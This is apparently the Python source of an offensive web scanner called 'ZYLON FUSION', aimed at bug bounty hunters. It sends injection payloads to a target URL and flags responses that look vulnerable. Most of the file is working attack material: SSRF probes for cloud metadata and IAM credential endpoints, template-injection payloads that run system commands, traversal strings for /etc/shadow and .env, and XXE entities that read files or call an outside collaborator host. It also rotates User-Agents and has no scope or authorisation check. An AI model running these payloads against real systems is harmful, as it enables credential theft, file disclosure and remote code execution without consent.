"""
ZYLON FUSION - Advanced Injection Arsenal
SSRF, SSTI, Path Traversal, XXE, IDOR, Race Condition
Bug Bounty Hunter Edition - Termux Non-Root Compatible
"""

import re
import json
import time
import socket
import requests
import threading
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.var import USER_AGENTS, DEFAULT_TIMEOUT, VERIFY_SSL, MAX_THREADS
import random


class InjectionArsenal:
    """Advanced Injection Testing Engine for Bug Bounty Hunters"""

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.session.verify = VERIFY_SSL

    def _rotate_ua(self):
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})

    # ========================================================================
    # SSRF (Server-Side Request Forgery) Scanner
    # ========================================================================

    def scan_ssrf(self, url, callback_domain=None):
        """
        Detect SSRF vulnerabilities by testing URL-accepting parameters
        with internal network addresses and callback URLs.
        
        SSRF is one of the highest-paying bug bounty vulnerabilities.
        """
        result = {'vulnerable': False, 'findings': [], 'tested_params': 0}

        # Parameters commonly vulnerable to SSRF
        ssrf_params = [
            'url', 'redirect', 'next', 'dest', 'destination', 'redirect_uri',
            'redirect_url', 'return', 'returnUrl', 'goto', 'link', 'reference',
            'src', 'source', 'target', 'callback', 'feed', 'img', 'image',
            'file', 'path', 'uri', 'domain', 'host', 'site', 'page',
            'fetch', 'load', 'include', 'proxy', 'request', 'api_url',
            'endpoint', 'resource', 'data', 'body', 'content', 'website',
        ]

        # SSRF payloads - internal network probes
        ssrf_payloads = [
            # Localhost variations
            'http://127.0.0.1',
            'http://localhost',
            'http://[::1]',
            'http://0.0.0.0',
            'http://0x7f000001',
            'http://2130706433',
            'http://0177.0.0.1',
            'http://127.1',
            'http://127.0.0.1:22',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:6379',
            # Cloud metadata endpoints (HIGH VALUE)
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/metadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys',
            'http://100.100.100.200/latest/meta-data/',
            'http://169.254.169.254/openstack/latest/meta_data.json',
            'http://169.254.169.254/metadata/v1.json',
            # Internal network
            'http://10.0.0.1',
            'http://10.0.0.2',
            'http://192.168.1.1',
            'http://192.168.0.1',
            'http://172.16.0.1',
            # DNS rebinding
            'http://ssrf.localtest.me',
            # Protocol smuggling
            'gopher://127.0.0.1:25/',
            'dict://127.0.0.1:6379/INFO',
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Get baseline
        try:
            baseline = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            baseline_len = 0
            baseline_status = 0

        for param in ssrf_params:
            for payload in ssrf_payloads:
                result['tested_params'] += 1
                try:
                    self._rotate_ua()
                    test_url = f"{base_url}?{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    # Check for SSRF indicators
                    ssrf_indicators = [
                        # AWS metadata
                        'ami-id', 'ami-launch-index', 'hostname', 'instance-id',
                        'instance-type', 'local-ipv4', 'mac', 'reservation-id',
                        'security-groups', 'iam', 'accessKeyId', 'secretAccessKey',
                        # GCP metadata
                        'projectId', 'numericProjectId', 'instanceId',
                        # Internal service responses
                        'root:x:0:0', 'daemon:x:', 'SSH-2.0',
                        'redis_version', 'Server: redis',
                        'MySQL', 'PostgreSQL',
                        # Error-based indicators
                        'Connection refused', 'No route to host',
                        'Name or service not known', 'couldn\'t connect to',
                        'Connection timed out',
                    ]

                    for indicator in ssrf_indicators:
                        if indicator.lower() in resp.text.lower() and indicator.lower() not in baseline.text.lower():
                            result['vulnerable'] = True
                            result['findings'].append({
                                'parameter': param,
                                'payload': payload,
                                'evidence': indicator,
                                'type': 'SSRF',
                                'url': test_url,
                                'severity': 'Critical' if 'meta-data' in payload or 'iam' in payload else 'High'
                            })
                            break

                    # Time-based detection (response time differences for internal vs external)
                    # If internal IP responds faster than baseline, likely SSRF

                    # Status code differences
                    if resp.status_code != baseline_status and resp.status_code == 200:
                        if abs(len(resp.text) - baseline_len) > 200:
                            result['findings'].append({
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Status: {resp.status_code}, Size diff: {len(resp.text) - baseline_len}',
                                'type': 'SSRF (Behavioral)',
                                'url': test_url,
                                'severity': 'Medium'
                            })

                except Exception:
                    continue

        return result

    # ========================================================================
    # SSTI (Server-Side Template Injection) Scanner
    # ========================================================================

    def scan_ssti(self, url):
        """
        Detect Server-Side Template Injection vulnerabilities.
        High severity - can lead to RCE.
        Supports: Jinja2, Twig, Mako, Freemarker, Velocity, ERB, Pug
        """
        result = {'vulnerable': False, 'findings': [], 'engine': None, 'tested': 0}

        # SSTI payloads with expected outputs
        ssti_payloads = [
            # Generic math (works in most engines)
            ('{{7*7}}', '49', 'Generic'),
            ('${7*7}', '49', 'Generic/EL'),
            ('#{7*7}', '49', 'Generic/Thymeleaf'),
            ('{{7*7}}', '49', 'Jinja2/Twig'),
            # Jinja2 specific
            ('{{7*\'7\'}}', '7777777', 'Jinja2'),
            ('{{config}}', 'Config', 'Jinja2/Flask'),
            ('{{self.__class__.__mro__}}', '__main__', 'Jinja2'),
            # Twig specific
            ('{{7*\'7\'}}', '49', 'Twig'),  # Twig returns 49, Jinja2 returns 7777777
            ('{{_self.env.display("id")}}', '', 'Twig'),
            # ERB (Ruby)
            ('<%= 7*7 %>', '49', 'ERB/Ruby'),
            ('<%= system("id") %>', '', 'ERB/Ruby'),
            # Mako (Python)
            ('${7*7}', '49', 'Mako'),
            # Freemarker
            ('${7*7}', '49', 'Freemarker'),
            ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', '', 'Freemarker'),
            # Velocity
            ('#set($x=7*7)$x', '49', 'Velocity'),
            # Pug/Jade
            ('#{7*7}', '49', 'Pug'),
            # Handlebars
            ('{{this}}', '', 'Handlebars'),
            # Angular
            ('{{constructor.constructor("return this")()}}', '', 'Angular'),
            # Vue.js
            ('{{_openBlock}}', '', 'Vue.js'),
            # Blindi/Blind SSTI
            ('{{7*7}}', '49', 'Blind'),
            # Polyglot
            ('${{{7*7}}}', '49', 'Polyglot'),
            # RCE confirmation
            ('{{\'\'.__class__.__mro__[1].__subclasses__()}}', '', 'Jinja2 RCE'),
        ]

        test_urls = self._get_test_urls(url)

        for test_url, params in test_urls:
            for param in params:
                for payload, expected, engine in ssti_payloads:
                    result['tested'] += 1
                    try:
                        self._rotate_ua()
                        full_url = f"{test_url}{'&' if '?' in test_url else '?'}{param}={quote(payload)}"

                        # Also test in POST body
                        resp_get = self.session.get(full_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                        resp_post = self.session.post(test_url, data={param: payload}, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                        for method, resp in [('GET', resp_get), ('POST', resp_post)]:
                            if expected and expected in resp.text:
                                result['vulnerable'] = True
                                result['engine'] = engine
                                result['findings'].append({
                                    'parameter': param,
                                    'payload': payload,
                                    'engine': engine,
                                    'method': method,
                                    'evidence': f'Expected "{expected}" found in response',
                                    'severity': 'Critical',
                                    'url': test_url
                                })
                                break

                            # Check for template errors (indicates template processing)
                            template_errors = [
                                'TemplateSyntaxError', 'Jinja2', 'Twig_Error',
                                'TemplateRenderingException', 'TemplateException',
                                'java.lang.ClassNotFoundException',
                                'Traceback (most recent call last)',
                                'undefined method', 'NameError',
                            ]
                            for err in template_errors:
                                if err in resp.text:
                                    result['findings'].append({
                                        'parameter': param,
                                        'payload': payload,
                                        'engine': engine,
                                        'method': method,
                                        'evidence': f'Template error: {err}',
                                        'severity': 'Medium',
                                        'url': test_url,
                                        'note': 'Template error indicates injection point - verify manually'
                                    })
                                    break

                    except Exception:
                        continue

        return result

    # ========================================================================
    # PATH TRAVERSAL / LFI Scanner
    # ========================================================================

    def scan_path_traversal(self, url):
        """
        Detect Local File Inclusion and Path Traversal vulnerabilities.
        Can lead to reading sensitive files like /etc/passwd, .env, etc.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # Path traversal payloads
        traversal_payloads = [
            # Basic Unix
            '../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../etc/shadow',
            # URL encoded
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            # Double encoding
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            # Null byte
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            # Windows
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
            # Interesting files
            '../../../.env',
            '../../../../.env',
            '../../../.git/config',
            '../../../.git/HEAD',
            '../../../proc/self/environ',
            '../../../proc/version',
            '/etc/hosts',
            # Filter bypass
            '....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            '..%00/..%00/..%00/etc/passwd',
        ]

        # File indicators
        file_indicators = {
            '/etc/passwd': ['root:x:0:0', 'daemon:x:', 'nobody:x:', 'bin:x:'],
            '/etc/shadow': ['root:', '/bin/bash', '/bin/sh'],
            '.env': ['DB_PASSWORD', 'SECRET_KEY', 'APP_KEY', 'API_KEY', 'DATABASE_URL'],
            '.git/config': ['[core]', 'repositoryformatversion', 'remote "origin"'],
            '.git/HEAD': ['ref: refs/'],
            '/proc/self/environ': ['HOME=', 'PATH=', 'USER='],
            'win.ini': ['[fonts]', '[extensions]', '[mci extensions]'],
            '/etc/hosts': ['localhost', '127.0.0.1'],
        }

        # Parameters commonly vulnerable to LFI
        lfi_params = [
            'file', 'path', 'dir', 'folder', 'include', 'require',
            'template', 'page', 'view', 'content', 'document', 'doc',
            'type', 'name', 'category', 'img', 'image', 'src',
            'action', 'callback', 'load', 'lang', 'style', 'module',
            'config', 'report', 'data', 'input', 'body', 'menu',
        ]

        test_urls = self._get_test_urls(url)

        for test_url, params in test_urls:
            for param in params:
                for payload in traversal_payloads:
                    result['tested'] += 1
                    try:
                        self._rotate_ua()
                        full_url = f"{test_url}{'&' if '?' in test_url else '?'}{param}={quote(payload)}"
                        resp = self.session.get(full_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                        # Check for file content indicators
                        for file_path, indicators in file_indicators.items():
                            if file_path in payload or any(c in payload for c in ['.env', '.git']):
                                for indicator in indicators:
                                    if indicator in resp.text:
                                        result['vulnerable'] = True
                                        result['findings'].append({
                                            'parameter': param,
                                            'payload': payload,
                                            'file': file_path,
                                            'evidence': indicator,
                                            'severity': 'Critical',
                                            'url': full_url
                                        })
                                        break

                        # Generic error indicators
                        error_indicators = ['No such file', 'not found', 'Failed opening',
                                          'include()', 'require()', 'open_basedir',
                                          'Permission denied', 'is a directory']
                        for err in error_indicators:
                            if err in resp.text:
                                result['findings'].append({
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'Error: {err}',
                                    'severity': 'Medium',
                                    'url': full_url,
                                    'note': 'Error indicates path processing - verify manually'
                                })
                                break

                    except Exception:
                        continue

        return result

    # ========================================================================
    # XXE (XML External Entity) Scanner
    # ========================================================================

    def scan_xxe(self, url):
        """
        Detect XXE vulnerabilities by sending XML payloads
        with external entity declarations.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # XXE payloads
        xxe_payloads = [
            # Basic XXE - read /etc/passwd
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',

            # XXE with parameter entity
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>''',

            # XXE - SSRF to cloud metadata
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',

            # Blind XXE with DNS callback
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://ZYLONXXETEST.burpcollaborator.net">
]>
<root>&xxe;</root>''',

            # XXE - read .env
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///.env">
]>
<root>&xxe;</root>''',

            # XXE Billion Laughs (DoS - use carefully)
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<root>&lol2;</root>''',

            # XInclude
            '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',

            # SVG XXE
            '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>''',

            # SOAP XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>''',
        ]

        # Test XML endpoints
        test_content_types = ['application/xml', 'text/xml']
        endpoints = self._find_xml_endpoints(url)

        for endpoint in endpoints:
            for payload in xxe_payloads:
                result['tested'] += 1
                try:
                    self._rotate_ua()
                    for content_type in test_content_types:
                        headers = {'Content-Type': content_type}
                        resp = self.session.post(
                            endpoint,
                            data=payload,
                            headers=headers,
                            timeout=DEFAULT_TIMEOUT,
                            verify=VERIFY_SSL
                        )

                        # Check for XXE indicators
                        xxe_indicators = [
                            'root:x:0:0', 'daemon:x:', 'nobody:x:',
                            'ami-id', 'instance-id',
                            'DB_PASSWORD', 'SECRET_KEY',
                            'No such file', 'cannot open',
                        ]

                        for indicator in xxe_indicators:
                            if indicator in resp.text:
                                result['vulnerable'] = True
                                result['findings'].append({
                                    'endpoint': endpoint,
                                    'content_type': content_type,
                                    'evidence': indicator,
                                    'severity': 'Critical',
                                    'note': 'XXE confirmed - file content in response'
                                })
                                break

                        # Check for XML parsing errors (may indicate XXE possibility)
                        xml_errors = [
                            'SimpleXMLElement', 'XMLReader', 'XMLError',
                            'not well-formed', 'xmlParseEntityDecl',
                            'DOCTYPE', 'entity', 'External entity',
                        ]
                        for err in xml_errors:
                            if err.lower() in resp.text.lower():
                                result['findings'].append({
                                    'endpoint': endpoint,
                                    'content_type': content_type,
                                    'evidence': f'XML error: {err}',
                                    'severity': 'Medium',
                                    'note': 'XML parsing detected - verify XXE manually'
                                })
                                break

                except Exception:
                    continue

        return result

    # ========================================================================
    # IDOR (Insecure Direct Object Reference) Detector
    # ========================================================================

    def scan_idor(self, url, auth_token=None):
        """
        Detect IDOR vulnerabilities by testing sequential/random IDs
        and checking for unauthorized access.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # IDOR-prone parameter names
        idor_params = [
            'id', 'user_id', 'uid', 'account_id', 'customer_id',
            'order_id', 'transaction_id', 'file_id', 'document_id',
            'profile_id', 'member_id', 'client_id', 'invoice_id',
            'post_id', 'comment_id', 'message_id', 'project_id',
            'report_id', 'ticket_id', 'subscription_id',
        ]

        # IDOR test values
        idor_values = [
            '1', '2', '3', '0', '-1', '999999', 'admin',
            '100', '1000', '0001', '01',
        ]

        # Setup auth if provided
        if auth_token:
            self.session.headers.update({'Authorization': f'Bearer {auth_token}'})

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = parse_qs(parsed.query)

        # Test existing ID parameters
        for param in existing_params:
            if param.lower() in [p.lower() for p in idor_params]:
                original_value = existing_params[param][0]
                for test_val in idor_values:
                    if test_val == original_value:
                        continue
                    result['tested'] += 1
                    try:
                        self._rotate_ua()
                        new_params = dict(existing_params)
                        new_params[param] = [test_val]
                        test_url = f"{base_url}?{urlencode({k: v[0] for k, v in new_params.items()})}"
                        resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                        # Check if different user's data is accessible
                        if resp.status_code == 200:
                            result['findings'].append({
                                'parameter': param,
                                'original_value': original_value,
                                'test_value': test_val,
                                'url': test_url,
                                'severity': 'High',
                                'note': 'Different ID returned 200 - verify data belongs to other user'
                            })
                        elif resp.status_code == 403:
                            pass  # Properly protected
                        elif resp.status_code == 404:
                            pass  # Resource doesn't exist

                    except Exception:
                        continue

        # Test IDOR with POST
        for param in idor_params:
            for test_val in idor_values[:5]:
                result['tested'] += 1
                try:
                    self._rotate_ua()
                    # GET
                    test_url = f"{base_url}?{param}={test_val}"
                    resp_get = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    # POST
                    resp_post = self.session.post(url, data={param: test_val}, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    for method, resp in [('GET', resp_get), ('POST', resp_post)]:
                        if resp.status_code == 200 and len(resp.text) > 100:
                            # Check for sensitive data indicators
                            sensitive_indicators = ['email', 'phone', 'address', 'password',
                                                  'credit', 'ssn', 'name', 'dob', 'salary']
                            found_sensitive = [s for s in sensitive_indicators if s.lower() in resp.text.lower()]
                            if found_sensitive:
                                result['vulnerable'] = True
                                result['findings'].append({
                                    'parameter': param,
                                    'test_value': test_val,
                                    'method': method,
                                    'sensitive_data': found_sensitive,
                                    'severity': 'Critical',
                                    'url': test_url if method == 'GET' else url
                                })
                except Exception:
                    continue

        return result

    # ========================================================================
    # RACE CONDITION Tester
    # ========================================================================

    def scan_race_condition(self, url, data=None, concurrent_requests=20):
        """
        Test for race conditions by sending multiple simultaneous requests.
        Common in: coupon codes, balance transfers, voting, file uploads.
        """
        result = {'vulnerable': False, 'findings': [], 'requests_sent': 0}

        if data is None:
            data = {'action': 'test', 'amount': '1'}

        # Send burst of simultaneous requests
        responses = []
        barrier = threading.Barrier(concurrent_requests)

        def send_request(request_num):
            try:
                barrier.wait(timeout=5)
                resp = self.session.post(url, data=data, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                return request_num, resp.status_code, len(resp.text), resp.text[:200]
            except Exception as e:
                return request_num, None, 0, str(e)

        with ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
            futures = [executor.submit(send_request, i) for i in range(concurrent_requests)]
            for future in as_completed(futures):
                result['requests_sent'] += 1
                try:
                    req_num, status, size, body = future.result()
                    responses.append({'request': req_num, 'status': status, 'size': size})
                except Exception:
                    pass

        # Analyze responses
        status_counts = {}
        for resp in responses:
            status = resp.get('status')
            if status:
                status_counts[status] = status_counts.get(status, 0) + 1

        # If we get multiple 200s when only one should succeed, it's a race condition
        success_count = status_counts.get(200, 0)
        if success_count > 1:
            # Check if responses differ (indicating state change)
            sizes = [r['size'] for r in responses if r.get('status') == 200]
            if len(set(sizes)) > 1:
                result['vulnerable'] = True
                result['findings'].append({
                    'success_count': success_count,
                    'total_requests': concurrent_requests,
                    'different_response_sizes': len(set(sizes)),
                    'severity': 'High',
                    'note': 'Multiple successful responses with different sizes - race condition likely'
                })
            elif success_count == concurrent_requests:
                result['findings'].append({
                    'success_count': success_count,
                    'total_requests': concurrent_requests,
                    'severity': 'Medium',
                    'note': 'All requests succeeded - may be race condition or lack of duplicate check'
                })

        result['response_summary'] = status_counts
        return result

    # ========================================================================
    # PROTOTYPE POLLUTION Scanner
    # ========================================================================

    def scan_prototype_pollution(self, url):
        """
        Detect JavaScript Prototype Pollution vulnerabilities.
        Can lead to XSS, CSRF bypass, and RCE in Node.js.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        pp_payloads = [
            # Basic prototype pollution via query params
            {'__proto__[test]': 'zylon'},
            {'constructor.prototype.test': 'zylon'},
            {'__proto__.test': 'zylon'},
            # Nested
            {'__proto__[toString]': 'zylon'},
            {'constructor[prototype][test]': 'zylon'},
            # JSON body payloads
            {'__proto__': {'test': 'zylon'}},
            {'constructor': {'prototype': {'test': 'zylon'}}},
        ]

        for i, payload in enumerate(pp_payloads):
            result['tested'] += 1
            try:
                self._rotate_ua()

                # Test via query string
                if all(isinstance(v, str) for v in payload.values()):
                    test_url = f"{url}{'&' if '?' in url else '?'}{urlencode(payload)}"
                    resp = self.session.get(test_url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    # Check for prototype pollution indicators
                    pp_indicators = ['zylon', 'test', '__proto__', 'prototype']
                    body_lower = resp.text.lower()

                    # Check if payload is reflected in a way that suggests PP
                    if '__proto__' in resp.text or 'constructor.prototype' in resp.text:
                        result['findings'].append({
                            'payload': payload,
                            'method': 'GET',
                            'severity': 'Medium',
                            'note': 'Prototype pollution keywords reflected - verify in browser console'
                        })

                # Test via POST JSON body
                json_payload = {
                    '__proto__': {'zylon_pp_test': 'vulnerable'},
                    'zylon_normal': 'test'
                }
                resp = self.session.post(
                    url,
                    json=json_payload,
                    timeout=DEFAULT_TIMEOUT,
                    verify=VERIFY_SSL
                )

                if 'zylon_pp_test' in resp.text:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'payload': json_payload,
                        'method': 'POST (JSON)',
                        'evidence': 'Polluted property reflected in response',
                        'severity': 'High'
                    })

            except Exception:
                continue

        return result

    # ========================================================================
    # HELPER METHODS
    # ========================================================================

    def _get_test_urls(self, url):
        """Collect URLs with parameters for injection testing"""
        test_urls = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if params:
            test_urls.append((url, list(params.keys())))
        else:
            # Test with common parameters
            test_urls.append((url, ['q', 'id', 'page', 'search', 'file']))

        # Discover more URLs
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')

            for form in soup.find_all('form'):
                action = form.get('action', '')
                form_url = urljoin(url, action) if action else url
                inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
                if inputs:
                    test_urls.append((form_url, inputs))

            for tag in soup.find_all('a', href=True):
                href = urljoin(url, tag['href'])
                link_params = parse_qs(urlparse(href).query)
                if link_params and href not in [u[0] for u in test_urls]:
                    test_urls.append((href, list(link_params.keys())))

        except Exception:
            pass

        return test_urls[:15]

    def _find_xml_endpoints(self, url):
        """Find endpoints that accept XML input"""
        endpoints = [url]

        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')

            # Look for SOAP/XML endpoints
            for tag in soup.find_all('a', href=True):
                href = tag['href'].lower()
                if any(x in href for x in ['soap', 'wsdl', 'api', 'xml', 'rpc', 'service']):
                    endpoints.append(urljoin(url, tag['href']))

            # Look for forms
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    endpoints.append(urljoin(url, action))

        except Exception:
            pass

        # Add common API endpoints
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        api_endpoints = [
            '/api', '/api/v1', '/api/xml', '/soap', '/wsdl',
            '/rpc', '/xmlrpc', '/graphql', '/service',
        ]
        for endpoint in api_endpoints:
            endpoints.append(f"{base}{endpoint}")

        return list(set(endpoints))
